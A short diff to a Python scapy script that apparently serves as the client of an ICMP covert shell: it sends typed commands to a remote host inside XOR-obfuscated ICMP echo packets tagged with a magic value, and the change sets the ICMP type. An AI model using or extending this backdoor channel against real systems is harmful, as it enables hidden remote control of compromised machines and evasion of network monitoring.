@@ -54,7 +54,9 @@ def action(pkt):
 			sendp(packet_builder(shell + raw_input()), verbose=0, iface=sys.argv[2])
 
 def packet_builder(data):
-	return Ether() / IP(dst=sys.argv[1]) / ICMP() / (XOR(client_magic + data))
+	packet = Ether() / IP(dst=sys.argv[1]) / ICMP(type=8) / (XOR(client_magic + data))
+        #packet.type = 0
+	return packet
 
 def XOR(p):
 	buff = ""
